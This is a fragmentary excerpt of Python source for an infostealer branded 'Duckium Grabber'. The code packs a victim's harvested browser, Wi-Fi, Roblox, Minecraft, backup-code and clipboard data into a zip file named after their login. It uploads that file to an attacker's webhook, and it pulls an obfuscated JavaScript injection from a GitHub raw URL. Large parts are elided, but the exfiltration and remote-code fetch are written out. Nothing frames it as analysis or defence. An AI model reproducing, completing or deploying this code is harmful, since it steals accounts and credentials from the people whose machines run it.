# Duckium Grabber All Rights Recieved
# Coded by inlyduck
...
def main(webhook: str):
    ...
    _file = f'{localappdata}\\Duckium-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Duckium-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Duckium-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Duckium Grabber | Created By Smug"
                    },
                    "thumbnail": {
...
class Injection:
    def __init__(self, webhook: str) -> None:
        ...
        self.code = requests.get('https://raw.githubusercontent.com/Smug246/Duckium-injection/main/obfuscated-injection.js').text
